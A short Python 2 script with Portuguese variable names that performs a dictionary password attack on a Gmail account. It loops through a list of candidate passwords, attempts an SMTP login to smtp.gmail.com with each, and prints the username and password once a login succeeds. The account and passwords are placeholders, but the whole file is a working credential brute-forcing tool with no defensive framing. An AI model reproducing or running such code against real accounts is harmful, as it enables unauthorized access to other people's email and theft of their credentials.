import smtplib
login = "exemplo@gmail.com"
senhas = ["senha1", "senha2", "senha3","senha4"]
for senha in senhas:
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    try:
        server.login(login, senha)
    except smtplib.SMTPAuthenticationError:
        print "Erro ->", senha
    else:
        print "USER:", login
        print "PASS:", senha
        break
    finally:
        server.close()
